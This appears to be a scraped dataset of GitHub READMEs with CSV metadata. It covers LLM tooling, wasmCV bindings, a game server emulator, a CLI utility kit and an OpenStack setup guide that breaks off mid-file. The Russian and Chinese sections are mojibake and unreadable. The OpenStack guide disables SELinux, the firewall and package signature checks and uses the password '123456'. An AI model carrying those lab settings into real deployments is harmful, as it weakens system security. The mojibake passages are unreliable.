After running, the output will be saved to `data/out.txt` in the following format:

`wallet_address|proxy_wallet_address|user_id|preferences_id`

---

## –†—É—Å—Å–∫–∏–π

### –ì–¥–µ –Ω–∞—Å –Ω–∞–π—Ç–∏

Telegram channel: [https://t.me/fragment_software](https://t.me/fragment_software)

Telegram chat: [https://t.me/fragment_software_chat](https://t.me/fragment_software_chat)

### –£—Å—Ç–∞–Ω–æ–≤–∫–∞

#### –ü—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è

- **Rust** : –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ Rust —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω. –í—ã –º–æ–∂–µ—Ç–µ —Å–∫–∞—á–∞—Ç—å –∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å Rust —Å [https://www.rust-lang.org/tools/install]().

### –°–±–æ—Ä–∫–∞

–ö–ª–æ–Ω–∏—Ä—É–π—Ç–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π –∏ —Å–æ–±–µ—Ä–∏—Ç–µ –ø—Ä–æ–µ–∫—Ç:

```
git clone https://github.com/Fragment-Software/polymarket-eye.git
cd polymarket-eye
cargo build --release
```

### –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è

–ü–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–π—Ç–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ–∞–π–ª—ã:

1. **private_keys.txt** : –î–æ–±–∞–≤—å—Ç–µ –≤–∞—à–∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã–µ –∫–ª—é—á–∏ –≤ `data/private_keys.txt`.
2. **proxies.txt** : –î–æ–±–∞–≤—å—Ç–µ –≤–∞—à–∏ –ø—Ä–æ–∫—Å–∏ –≤ `data/proxies.txt`.

### –ó–∞–ø—É—Å–∫

–ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–π –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª:

`cargo run --release `

### –í—ã–≤–æ–¥

–ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ `data/out.txt` –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ñ–æ—Ä–º–∞—Ç–µ:

`wallet_address|proxy_wallet_address|user_id|preferences_id`
",0,0,1,,,0.0
guidance-ai/llgtrt,main,"# llgtrt (llguidance + TensorRT-LLM)

This project implements a REST HTTP server with 
[OpenAI-compatible API](https://platform.openai.com/docs/api-reference/introduction),
based on [NVIDIA TensorRT-LLM](https://github.com/NVIDIA/TensorRT-LLM)
and [llguidance library](https://github.com/microsoft/llguidance) for constrained output.

The server supports regular completions and chat endpoints with JSON schema enforcement (""Structured Output""), as well as full context-free grammars using the [Guidance library](https://github.com/guidance-ai/guidance).

This server is similar in spirit to the [TensorRT-LLM OpenAI server example](https://github.com/NVIDIA/TensorRT-LLM/blob/main/examples/apps/openai_server.py), but it is Python-free (implemented in Rust) and includes support for constrained output. Like the example above, it **does not** use the NVIDIA Triton Inference Server.

## Structured Output

The sampling can be constrained by the [Low-Level Guidance library](https://github.com/microsoft/llguidance), part of the [Guidance project](https://github.com/guidance-ai/guidance). While TensorRT computes logits (token probabilities) for the next token, the llguidance library computes a set of tokens allowed by the grammar (whether JSON schema, regular expression, or a full context-free grammar (CFG)) in the form of a bitmask. When both the logits and bitmask are ready, a custom CUDA kernel applies the mask to the logits, and the result is used for sampling inside of TensorRT-LLM.

There is no significant startup cost for all realistic sizes of grammars (no measurable impact on time to first token (TTFT)). The overhead on generation speed (median time between tokens (TBT)) is typically 1-3%. The mask computation takes on the order of 1 ms of single-core CPU time per token per sequence in the batch. Thus, with 16 cores and a TBT of around 10 ms, batch sizes of up to 160 are not CPU-bound. Typically, the unconstrained TBT is higher at such batch sizes, and more cores are available, so batch size is not a problem in production.

This approach differs from [Outlines](https://github.com/dottxt-ai/outlines) (which pre-computes masks, resulting in a startup cost and limits on schema complexity) and is more similar in spirit to [llama.cpp grammars](https://github.com/ggerganov/llama.cpp/blob/master/grammars/README.md), though it is much faster due to the use of a custom lexer with [derivative-based regexes](https://github.com/microsoft/derivre), an Earley parser, and a [highly optimized](https://github.com/microsoft/toktrie/blob/main/implementation.md) token prefix tree.

## Requirements

You will need a Linux machine with an NVIDIA GPU and Docker set up to use the `nvidia-docker` runtime.

So far, we have only tested it on 4xA100 (and single A100).

## Running

Overview of steps:

- Build or pull the `llgtrt/llgtrt` Docker container.
- Build a trtllm engine (likely using the container).
- Create configuration files.
- Use the container to run the engine.

### Building or Pulling Docker Container

To use a pre-built container, run:

```bash
docker pull llgtrt/llgtrt
```

To build a container, use:

```bash
./docker/build.sh
```

The build script will initialize submodules if they are missing. It takes about 15 minutes on a GitHub runner and should typically be faster on a local machine.

### Building the TensorRT-LLM Engine

This is based on the [TensorRT-LLM Quick-start](https://nvidia.github.io/TensorRT-LLM/quick-start-guide.html).
Follow the steps here, and look into that guide if needed.

First, use the `llgtrt/llgtrt` container to run bash.

```bash
./docker/bash.sh --volume /path/to/hf-models:/models
```

The following steps are done inside the container:

```bash
# Convert the HF model to a checkpoint
python3 /opt/TensorRT-LLM-examples/llama/convert_checkpoint.py \
    --dtype bfloat16 \
    --model_dir /models/Meta-Llama-3.1-8B-Instruct \
    --output_dir /models/model-ckpt \
    --tp_size 1

# Then, run trtllm build
trtllm-build --checkpoint_dir /models/model-ckpt \
    --gemm_plugin bfloat16 \
    --output_dir /models/model-engine \
    --use_paged_context_fmha enable

# Clean up checkpoint (optional)
rm -rf /models/model-ckpt

# Finally, copy tokenizer.json and tokenizer_config.json
cp /models/Meta-Llama-3.1-8B-Instruct/tokenizer.json /models/model-engine
cp /models/Meta-Llama-3.1-8B-Instruct/tokenizer_config.json /models/model-engine

# Exit the container
exit
```

Make sure to modify the path to the input model (it needs to contain the HF Transformers `config.json` as well as the `.safetensors` files and `tokenizer.json`). If you're running on more than one GPU, modify the `--tp_size` argument.

### Running the Engine

```bash
PORT=3001 ./docker/run.sh /path/to/hf-models/model-engine
```

The command will print out the actual `docker run` invocation on the first line if you want to invoke it directly later. `PORT` defaults to 3000.

### Update Configuration (Optional)

The defaults should be mostly reasonable, but you can modify them. First, generate a template configuration file:

```bash
./docker/run.sh /path/to/hf-models/model-engine --print-config > llgtrt.json5
```

The file will contain commented-out defaults for all supported options (JSON5 is a superset of JSON, so you can use comments). Edit it and move it to the engine folder.

To modify the chat template, you can either use `--print-complete-config`, which will include the chat template from `tokenizer_config.json`, or preferably create a separate `chat_template.j2` file in the engine folder:

```bash
./docker/run.sh /path/to/hf-models/model-engine --print-chat-template > chat_template.j2
mv chat_template.j2 /path/to/hf-models/model-engine
```

The paths to `llgtrt.json5` and `chat_template.j2` are controlled by command line arguments. See `--help` for more info:

```bash
./docker/run.sh /path/to/hf-models/model-engine --help
```

You can specify multiple JSON5 config files, and they will be merged in the order specified (with later ones overriding earlier ones). This way, you can separate configuration for the tokenizer, runtime, and guidance parser.

### Running phi-3

The phi-3 tokenizer, while based on llama2 is slightly different.
Drop the following `llgtrt.json5` file in engine folder:

```json5
{
  ""tokenizer"": {
    ""bos_token"": null,
    ""n_vocab_override"": 32064
  }
}
```

## Development

First, build the Docker container to be used in the dev container. If you have already followed the steps above, you can skip this. Otherwise, run `./docker/build.sh`.

Next, in VSCode, reopen the folder in the container.

## Credits

The basic structure of the server borrows inspiration from [npuichigo/openai_trtllm](https://github.com/npuichigo/openai_trtllm), which has similar aims but uses NVIDIA Triton Server wrapping TensorRT-LLM.

## TODO

- [ ] multi-LoRA?
- [x] test phi-3.5
- [ ] multi-modal input
- [ ] when streaming, and stop is set, we need to buffer the output so as not to return the stop sequence itself
- [ ] logprobs (currently only work with TP>1; TRTLLM bug?)
- [ ] logprobs with argmax sampling and constraints
- [ ] expose the 'surprise' measure somehow
",0,2,4,MIT,docker.yaml,5.0
jtang613/GhidrAssist,master,"# GhidrAssist
Author: **Jason Tang**

_A plugin that provides LLM helpers to explain code and assist in RE._

## Support Continued Improvements

[![""Buy Me A Beer""](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/jtang613)

## Description:

This is a LLM plugin aimed at enabling the use of local LLM's (ollama, text-generation-webui, lm-studio, etc) for assisting with binary exploration and reverse engineering. It supports any OpenAI v1-compatible API. Recommended models are LLaMA-based models such as llama3.1:8b, but others should work as well.

Current features include:
* Explain the current function - Works for disassembly and pseudo-C.
* Explain the current instruction - Works for disassembly and pseudo-C.
* General query - Query the LLM directly from the UI.
* Propose actions - Provide a list of proposed actions to apply.
* Function calling - Allow agent to call functions to navigate the binary, rename functions and variables.
* RAG augmentation - Supports adding contextual documents to refine query effectiveness.
* RLHF dataset generation - To enable model fine tuning.
* Settings to modify API host, key, model name and max tokens.

Future Roadmap:
* Agentic assistant - Use Autogen or similar framework for self-guided binary RE.
* Model fine tuning - Leverage the RLHF dataset to fine tune the model.

## Quickstart

* If necessary, copy the binary release ZIP archive to the Ghidra_Install/Extensions/Ghidra directory.
* Launch Ghidra -> File -> Configure -> Miscellaneous -> Enable GhidrAssist.
* Load a binary and launch the CodeBrowser.
* Open Tool Settings -> GhidraAssist.
* Ensure the RLHF and RAG database paths are appropriate for your environment.
* Point the API host to your preferred API provider and set the API key. 
* Open GhidrAssist with the GhidrAssist option in the Windows menu and start exploring.

## Screenshot
![Screenshot](/res/screenshot1.png)
![Screenshots](/res/screenshots_anim.gif)

## Homepage
https://github.com/jtang613/GhidrAssist


## Minimum Version

This plugin requires the following minimum version of Ghidra:

* 11.0

## License

This plugin is released under a MIT license.
",8,0,1,MIT,,1.0
wasmvision/wasmcv,main,"# wasmCV

wasmCV provides WebAssembly guest interface bindings for computer vision applications based on [OpenCV](https://github.com/opencv/opencv).

It includes [WIT](https://github.com/WebAssembly/component-model/blob/main/design/mvp/WIT.md) files defining the interface to be used between a WebAssembly host application and a WASM guest module intended to process OpenCV `Mat` image frames.

These interface definitions are then used to generate WASM bindings for TinyGo, Rust, and C. Those bindings can then be used in a WASM guest module to call OpenCV functions implemented by the host to obtain information or perform operations on OpenCV image frames.

```mermaid
flowchart LR
    subgraph host
        OpenCV
        Runtime[WASM Runtime]<-->OpenCV
    end
    subgraph guest
        Runtime<--wasmCV-->processor-go.wasm
        Runtime<--wasmCV-->processor-rust.wasm
        Runtime<--wasmCV-->processor-c.wasm
        processor-go.wasm
        processor-rust.wasm
        processor-c.wasm
    end
```

## Example wasmCV modules

### TinyGo

This TinyGo module exports a `process()` function to the WASM host application, which passes in the wasmCV image `Mat` to be processed. It then calls functions on that `Mat` which are handled by the host application by calling OpenCV to actually perform the operations.

```go
package main

import (
	""github.com/hybridgroup/mechanoid/convert""
	""wasmcv.org/wasm/cv/mat""
)

//go:wasmimport hosted println
func println(ptr, size uint32)

//export process
func process(image mat.Mat) mat.Mat {
	println(convert.StringToWasmPtr(""Cols: "" +
		convert.IntToString(int(image.Cols())) +
		"" Rows: "" +
		convert.IntToString(int(image.Rows())) +
		"" Type: "" +
		convert.IntToString(int(image.Type()))))

	return image
}

func main() {}
```

Install the `wasmcv` package into your Go package:

```shell
go get wasmcv.org/wasm/cv
```

You can then compile this module using the TinyGo compiler.

```shell
tinygo build -o processor.wasm -target=wasm-unknown processor.go
```

Note that the `wasm-unknown` target can be used with wasmCV to produce very lightweight guest modules. The example above compiles to around 31k, including debug information.

```shell
-rwxrwxr-x 1 ron ron 31248 sep 11 11:00 processor.wasm
```

See the [basic example application here](./examples/basic) to give it a try.

### Rust

This Rust module does the same thing as the TinyGo wasm module example. It exports a `process()` function to the WASM host application, which then passes in the wasmCV image `Mat` to be processed. The module then calls functions on that `Mat` which are handled by the host application by calling OpenCV to actually perform the operations.

```rust
#![no_std]

extern crate core;
extern crate alloc;

use alloc::string::String;
use alloc::string::ToString;
use wasmcv::wasm::cv;

#[no_mangle]
pub extern fn process(mat: cv::mat::Mat) -> cv::mat::Mat {
    println(&[""Cols: "", &mat.cols().to_string(), "" Rows: "", &mat.rows().to_string(), "" Size: "", &mat.size().len().to_string()].concat());

    return mat;
}

/// Print a message to the host [`_println`].
fn println(message: &String) {
    unsafe {
        let (ptr, len) = string_to_ptr(message);
        _println(ptr, len);
    }
}

#[link(wasm_import_module = ""hosted"")]
extern ""C"" {
    #[link_name = ""println""]
    fn _println(ptr: u32, size: u32);
}

unsafe fn string_to_ptr(s: &String) -> (u32, u32) {
    return (s.as_ptr() as u32, s.len() as u32);
}

#[no_mangle]
pub extern fn malloc(size: usize) -> *mut u8 {
    let layout = core::alloc::Layout::from_size_align(size, 1).unwrap();
    unsafe { alloc::alloc::alloc(layout) }
}
```

Install the `wasmcv` crate into your Rust project:

```shell
cargo add wasmcv
```

You can then compile this module using the Rust compiler.

```shell
cargo build --target wasm32-unknown-unknown --release
```

The `wasm32-unknown-unknown` target can be used with wasmCV to produce very lightweight guest modules when combined with `no_std`. The example above compiles to around 14k, including debug information.

```shell
-rwxrwxr-x 1 ron ron 14488 sep 12 14:23 processrs.wasm
```

See the [multi example application here](./examples/multi) to try wasmCV with Rust.

### C

This C module does the same thing as the TinyGo and Rust wasm module examples. It exports a `process()` function to the WASM host application, which then passes in the wasmCV image `Mat` to be processed. The module then calls functions on that `Mat` which are handled by the host application by calling OpenCV to actually perform the operations.

```c
#include <string.h>
#include ""../../../../components/c/wasmcv/imports.h""

extern int itoa(int value, char *sp, int radix);

__attribute__((import_module(""hosted""), import_name(""println""))) void println(int32_t str, int32_t len);

wasm_cv_mat_borrow_mat_t process(wasm_cv_mat_borrow_mat_t image) {
    int32_t cols, rows;
    cols = wasm_cv_mat_method_mat_cols(image);
    rows = wasm_cv_mat_method_mat_rows(image);

    char buf[20];
    strcpy(buf, ""Cols: "");
    itoa(cols, buf+6, 10);
    strcpy(buf+9, "" Rows: "");
    itoa(rows, buf+16, 10);

    println((int32_t)buf, 20);

    return image;
}
```

You can then compile this module using the `clang` compiler.

```shell
/opt/wasi-sdk/bin/clang --target=wasm32-unknown-unknown -O3 \
        --sysroot=""/path/to/lib/wasi-libc/sysroot"" \
        -z stack-size=4096 -Wl,--initial-memory=65536 \
        -o ../processc.wasm process.c itoa.c ../../../../components/c/wasmcv/import.c ../../../../components/c/wasmcv/import_component_type.o \
        -Wl,--export=process \
        -Wl,--export=__data_end -Wl,--export=__heap_base \
        -Wl,--strip-all,--no-entry \
        -Wl,--unresolved-symbols=ignore-all \
        -nostdlib \
```

The `wasm32-unknown-unknown` target can be used with wasmCV to produce very lightweight guest modules. The example above compiles to just under 3k, including debug information.

```shell
-rwxrwxr-x 1 ron ron  2916 sep 13 20:03 processc.wasm
```

See the [multi example application here](./examples/multi) to try wasmCV with C.

## WASM Component Generation

WASM Guest bindings are generated using `wit-bindgen` v0.33 or above.

https://github.com/bytecodealliance/wit-bindgen

Go bindings are generated by `wit-bindgen-go` v0.3.0 or above.

https://github.com/bytecodealliance/wasm-tools-go

### TinyGo

```shell
wit-bindgen-go generate --out ./components/tinygo -w imports -p wasmcv.org ./wit/
```

Note that the TinyGo bindings are a git submodule. When regenerating the submodule must be updated in order to update the separate Go package repo.

### Rust

```shell
wit-bindgen rust --out-dir ./components/rust/wasmcv/src -w imports ./wit/
```

### C

```shell
wit-bindgen c --out-dir ./components/c/wasmcv/ -w imports ./wit/
```

",0,0,1,NOASSERTION,,10.0
iw2d/kinoko,main,"## Kinoko

Kinoko is a server emulator for the popular mushroom game.

## Setup

Basic configuration is available via environment variables - the names and default values of the configurable options
are defined in [ServerConstants.java](src/main/java/kinoko/server/ServerConstants.java)
and [ServerConfig.java](src/main/java/kinoko/server/ServerConfig.java).

> [!NOTE]
> Client WZ files are expected to be present in the `wz/` directory in order for the provider classes to extract the
> required data. The required files are as follows:
> ```
> Character.wz
> Item.wz
> Skill.wz
> Morph.wz
> Map.wz
> Mob.wz
> Npc.wz
> Reactor.wz
> Quest.wz
> String.wz
> Etc.wz
> ```

#### Java setup

Building the project requires Java 21 and maven.

```bash
# Build jar
$ mvn clean package
```

#### Database setup

It is possible to use either CassandraDB or ScyllaDB, no setup is required other than starting the database.

```bash
# Start CassandraDB
$ docker run -d -p 9042:9042 cassandra:5.0.0

# Alternatively, start ScyllaDB
$ docker run -d -p 9042:9042 scylladb/scylla --smp 1
```

You can use [Docker Desktop](https://www.docker.com/products/docker-desktop/) or WSL on Windows.

#### Docker setup

Alternatively, docker can be used to build and start the server and the database using
the [docker-compose.yml](docker-compose.yml) file. The requirements are as follows:

- docker : required for building and running the server and database containers
- cqlsh : required for the health check for the database container

```bash
# Build and start containers
$ docker compose up -d
```
",0,10,2,,,12.0
Timmoth/aid-cli,main,"<p align=""center"">
   <div style=""width:640;height:320"">
       <img style=""width: inherit"" src=""./banner.png"">
</div>
</p>
A CLI toolkit featuring a variety of helpful utilities.

```
aid math plot --start -20 --end 20 --step 0.5 --exp ""x * sin(1 - x)""
                        |                      *
    *                   |                     **
   ***                  |                     **
   * *                  |                    ***
   * *                  |             **     * **
   * *     **           |             ***    *  *
   * *     ***          |             * *    *  *
  **  *   ** *          |     ***    *  *    *  *
  *   *   *  *    ***   |     * *    *  *    *  *
  *   *   *  **   * **  |    **  *   *  **   *  *
--*---*---*---*--**--******-**---*---*---*--*---*-
  *   *  **   *  *      | ***    *  *    *  *   **
  *   *  *    ****      |         * *    *  *
  *    * *     **       |         * *    *  *
 **    * *              |         ***    ** *
 *     ***              |                 ***
 *     **               |                 **
 *                      |                 **
**                      |
**                      |
```
## Read the [docs](https://timmoth.github.io/aid-cli/)
for all supported commands, parameters, and examples

## Installation

Manual installation is simple, just download the release and add it to your PATH environment variable, if you'd like an even easier way i've added scripts to do it for you.

### Linux / Mac (apple silicon supported)
```
wget https://raw.githubusercontent.com/Timmoth/aid-cli/refs/heads/main/install.sh
chmod +x install.sh
sudo ./install.sh
```
### Windows (powershell)
```
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Timmoth/aid-cli/refs/heads/main/install.ps1 -OutFile install.ps1
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
.\install.ps1
```

### Releases
[Download the latest release](https://github.com/Timmoth/aid-cli/releases)

## Top level commands:
```
 | command     | description                                               |
 | ----------- | --------------------------------------------------------- |
 | aid http    | HTTP functions                                            |
 | aid ip      | IP information / scanning                                 |
 | aid port    | Port information / scanning                               |
 | aid cpu     | System cpu information                                    |
 | aid mem     | System memory information                                 |
 | aid disk    | System disk information                                   |
 | aid network | System network information                                |
 | aid json    | JSON parsing / extraction functions                       |
 | aid csv     | CSV search / transformation functions                     |
 | aid text    | Text manipulation functions                               |
 | aid file    | File info functions                                       |
 | aid time    | Time related functions                                    |
 | aid bits    | Bit manipulation functions                                |
 | aid math    | Math functions                                            |
 | aid process | Process monitoring functions                              |
 | aid env     | Environment information                                   |
 | aid help    | Print this message or the help of the given subcommand(s) |
```
## All commands:
 [More info](https://timmoth.github.io/aid-cli/)
```
| version    | command                | description                                                            |
| ---------- | ---------------------- | ---------------------------------------------------------------------- |
| [u] 0.1.3  | aid http req           | Make a HTTP request                                                    |
| [u] 0.1.3  | aid http serve         | Start a dummy HTTP server                                              |
| [u] 0.1.3  | aid ip local           | Show my local IP address                                               |
| [u] 0.1.3  | aid ip public          | Show my public IP address                                              |
| [u] 0.1.3  | aid ip scan            | Scan a specified IP address subnet for active ip addresses             |
| [u] 0.1.3  | aid ip status          | Try to connect to the specified IP address                             |
| [u] 0.1.3  | aid port status        | Check if the specified port is 'open' or 'closed'.                     |
| [u] 0.1.3  | aid port scan          | Scan for open ports on a specified IP address                          |
| [u] 0.1.3  | aid cpu info           | Show CPU information                                                   |
| [u] 0.1.6  | aid cpu usage          | Monitor CPU usage                                                      |
| [u] 0.1.6  | aid mem usage          | Monitor memory usage                                                   |
| [u] 0.1.3  | aid disk info          | Show disk information                                                  |
| [u] 0.1.3  | aid network info       | Show network information                                               |
| [u] 0.1.3  | aid network usage      | Display network usage                                                  |
| [a] 0.1.7  | aid process usage      | Display process usage                                                  |
| [u] 0.1.3  | aid json extract       | Extract a property from JSON data                                      |
| [u] 0.1.3  | aid json jwt-decode    | Decode a JWT                                                           |
| [u] 0.1.3  | aid csv search         | Sql search over csv                                                    |
| [u] 0.1.3  | aid text base64-encode | encodes a base64 string                                                |
| [u] 0.1.3  | aid text base64-decode | decodes a base64 string                                                |
| [a] 0.1.10 | aid text url-encode    | url encodes a string                                                   |
| [a] 0.1.10 | aid text url-decode    | decodes a url encoded string                                           |
| [u] 0.1.3  | aid text lines         | reads and prints lines from a text file                                |
| [a] 0.1.10 | aid text guid          | Generates a random GUID                                                |
| [a] 0.1.11 | aid text replace       | Find and replace text using a regex pattern in the given input string. |
| [a] 0.1.11 | aid text count         | Count occurrences of a regex pattern in the given input string.        |
| [u] 0.1.3  | aid file info          | prints file metadata                                                   |
| [u] 0.1.3  | aid file md5           | calculates the files Md5 checksum                                      |
| [u] 0.1.3  | aid file sha1          | calculates the files Sha1 checksum                                     |
| [u] 0.1.3  | aid file sha256        | calculates the files Sha256 checksum                                   |
| [a] 0.1.4  | aid file zip           | zips the files in the source directory                                 |
| [u] 0.1.9  | aid time unix          | Display unix timestamp                                                 |
| [u] 0.1.9  | aid time dt            | Display the datetime                                                   |
| [a] 0.1.9  | aid time chron         | Describes a chron job                                                  |
| [a] 0.1.9  | aid time count-down    | Starts a countdown timer                                               |
| [a] 0.1.8  | aid bits eval          | Bitwise expression evaluation / conversion / information               |
| [u] 0.1.10 | aid math eval          | Evaluates a math expression                                            |
| [u] 0.1.10 | aid math plot          | Plot a math expression                                                 |
| [a] 0.1.10 | aid env vars           | Filter / Display environment variables                                 |

[a] added in version x.x.x
[u] updated in version x.x.x
[p] patched in version x.x.x
[d] deprecated in version x.x.x
```

### Build
If you'd like to build the latest version from source:
```
//Install rust https://www.rust-lang.org/tools/install
git clone https://github.com/Timmoth/aid-cli
cd aid-cli
cargo build --release
.\target\release\aid.exe
```
",12,6,2,Apache-2.0,"docs.yml,release-pipeline.yml",0.0
KevenJAntenor/Quebec-Centralized-Medical-Record-System,main,"# Dossier M√©dical Centralis√© Qu√©bec (Quebec Centralized Medical Record System)

## Project Overview

This project aims to develop a centralized medical record system for the Quebec healthcare system. The software will allow users of the Quebec health system to have a centralized medical record, regardless of the doctor or healthcare facility they visit.

## Context

Currently, each doctor's office and hospital maintains its own patient records. In most cases, these records are never shared, preventing doctors from having a comprehensive view of a patient's health status. This system is designed to address this problem by centralizing patient medical records.

## Key Features

- Centralized patient medical records
- Access for healthcare providers to a patient's complete medical history
- Record of patient visits across different healthcare facilities
- Comprehensive view of known diagnoses
- Information on other doctors treating the patient

## Benefits

- Improved continuity of care
- Enhanced decision-making for healthcare providers
- Reduced redundancy in medical tests and procedures
- Better coordination among different healthcare providers

",0,0,1,,,0.0
xiegangqingnian1021/devops,master,"# ÊâãÊíï‰∫ëËÆ°ÁÆóËøêÁª¥ÂºÄÂèë

## 1.ÁõÆÂΩïÁªìÊûÑ

`fronted/` ÂâçÁ´Ø Âü∫‰∫é `vue`

`backend/` ÂêéÁ´Ø Âü∫‰∫é `SpringBoot`

`cmd/` ËøêÁª¥ËÑöÊú¨ Âü∫‰∫é `Linux Shell`

## 2.ÂáÜÂ§áÁéØÂ¢É

### 2.1‰∫ëËÆ°ÁÆóÂπ≥Âè∞Êê≠Âª∫

Êú¨Á≥ªÁªüÈááÁî®RedHatOpenStackPlatformÊê≠Âª∫ÁßÅÊúâ‰∫ë

‰ª•ÂçïËäÇÁÇπ‰∏∫‰æãÔºåËäÇÁÇπIP‰∏∫`192.168.105.10`Ôºå‰ΩøÁî®vmwareÂàõÂª∫‰∏ÄÂè∞`CentOS7.5`ËôöÊãüÊú∫ÔºåÈÖçÁΩÆ‰∏∫4Ê†∏CPU/8G/100GÔºå‰∏ªÊú∫Âêç‰∏∫controller

Êê≠Âª∫Ê≠•È™§Â¶Ç‰∏ã
- ÂÖ≥Èó≠Áõ∏ÂÖ≥ÊúçÂä°

ÊâÄÊúâËäÇÁÇπÂ°´ÂÜôÁΩëÁªúÊò†Â∞Ñ
```shell
$ echo ""192.168.105.10 controller"" >> /etc/hosts
```
ÊâÄÊúâËäÇÁÇπÊ∞∏‰πÖÂÖ≥Èó≠ selinuxÔºåÊ∞∏‰πÖÂÖ≥Èó≠ firewalldÔºåÊ∞∏‰πÖÂÖ≥Èó≠ NetworkManager
```shell
$ systemctl stop firewalld; systemctl disable firewalld
$ systemctl stop NetworkManager; systemctl disable NetworkManager
$ sed -i 's#SELINUX=.*#SELINUX=disabled#g' /etc/selinux/config
$ reboot
```
- ÈÖçÁΩÆyum

Ê∏ÖÁ©∫yumÊ∫ê

```shell
$ mv /etc/yum.repos.d/* /tmp/
```
Âú®controllerËäÇÁÇπÊåÇËΩΩÊú¨Âú∞Ê∫ê
```shell
$ mkdir -p /opt/{centos,extras,openstack}

$ mount -o loop /root/CentOS-7-x86_64-Everything-1804.iso /mnt/
$ cp -rvf /mnt/* /opt/centos/
$ umount /mnt/

$ mount -o loop /root/RHEL7-extras.iso /mnt/
$ cp -rvf /mnt/* /opt/extras/
$ umount /mnt/

$ mount -o loop /root/RHEL7OSP-10.iso /mnt/
$ cp -rvf /mnt/* /opt/openstack/
$ umount /mnt/
```
Âú®controllerËäÇÁÇπÁºñÂÜôÊú¨Âú∞Ê∫ê
```shell
$ vi /etc/yum.repos.d/local.repo
[centos]
name=centos
baseurl=file:///opt/centos/
gpgcheck=0
enabled=1

[extras]
name=extras
baseurl=file:///opt/extras/
gpgcheck=0
enabled=1

[openstack]
name=openstack-10
baseurl=file:///opt/openstack/rhel-7-server-openstack-10-rpms/
gpgcheck=0
enabled=1

[openstack-devtool]
name=openstack-10-devtools
baseurl=file:///opt/openstack/rhel-7-server-openstack-10-devtools-rpms/
gpgcheck=0
enabled=1
```
- ÈúÄË¶ÅÂÆâË£ÖÁöÑ‰æùËµñÂåÖ

qemu-kvm -> Á°¨‰ª∂‰ªøÁúü -> computeËäÇÁÇπ

libvirt-daemon -> ÂêéÂè∞ÁÆ°ÁêÜËøõÁ®ãÔºåÁÆ°ÁêÜÁ°¨‰ª∂‰ªøÁúü -> computeËäÇÁÇπ

libvirt-daemon-driver-qemu -> È©±Âä®Á®ãÂ∫è -> computeËäÇÁÇπ

libvirt-client -> ÂêéÂè∞ÁÆ°ÁêÜÁöÑÊé•Âè£ -> computeËäÇÁÇπ

python-setuptools -> Python -> controllerËäÇÁÇπ

ËäÇÁÇπÂÆâË£Ö‰æùËµñ

```shell
$ yum -y install qemu-kvm libvirt-client libvirt-daemon libvirt-daemon-driver-qemu python-setuptool
```

- Ê£ÄÊü•Âü∫Á°ÄÁéØÂ¢É

ÊòØÂê¶Á¶ÅÁî® firewalld Âíå NetworkManager

ÊòØÂê¶‰∏∫ÈùôÊÄÅ IP

‰∏ªÊú∫‰πãÈó¥ÊòØÂê¶ËÉΩ ping ÈÄö

‰æùËµñÂåÖÊòØÂê¶ÊòØ10670

‰æùËµñÊòØÂê¶ÂÆâË£Ö

```shell
$ systemctl start libvirtd
```

NTPÊòØÂê¶ÂèØÁî®ÔºåÊó∂Èó¥ÊòØÂê¶ÂêåÊ≠•

Ê£ÄÊü• /etc/resolv.conf ‰∏çËÉΩÊúâsearchÂºÄÂ§¥ÁöÑË°å
- ÂÆâË£ÖOpenStackÈúÄË¶Å‰ΩøÁî®ÁöÑ PackStack

Âú® controllerËäÇÁÇπ ÂÆâË£Ö

```shell
$ cd /root/
#ÂÆâË£ÖPackStack
$ yum -y install openstack-packstack
#‰ΩøÁî®PackStackÂàõÂª∫Â∫îÁ≠îÊñá‰ª∂
$ packstack --gen-answer-file=answer.ini
```

- ‰øÆÊîπÂ∫îÁ≠îÊñá‰ª∂

```shell
$ sed -i ""s#^CONFIG_SWIFT_INSTALL=.*#CONFIG_SWIFT_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CON:FIG_CEILOMETER_INSTALL=.*#CONFIG_CEILOMETER_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CONFIG_AODH_INSTALL=.*#CONFIG_AODH_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CONFIG_GNOCCHI_INSTALL=.*#CONFIG_GNOCCHI_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CONFIG_NTP_SERVERS=.*#CONFIG_NTP_SERVERS=time1.aliyun.com#g"" answer.ini
$ sed -i ""s#^CONFIG_COMPUTE_HOSTS=.*#CONFIG_COMPUTE_HOSTS=192.168.105.10#g"" answer.ini
$ sed -i ""s#^CONFIG_NETWORK_HOSTS=.*#CONFIG_NETWORK_HOSTS=192.168.105.10#g"" answer.ini
$ sed -i ""s#^CONFIG_KEYSTONE_ADMIN_PW=.*#CONFIG_KEYSTONE_ADMIN_PW=123456#g"" answer.ini
$ sed -i ""s#^CONFIG_NEUTRON_ML2_TYPE_DRIVERS=.*#CONFIG_NEUTRON_ML2_TYPE_DRIVERS=flat,vxlan#g"" answer.ini
$ sed -i ""s#^CONFIG_NEUTRON_OVS_BRIDGE_MAPPINGS=.*#CONFIG_NEUTRON_OVS_BRIDGE_MAPPINGS=physnet1:br-ex#g"" answer.ini
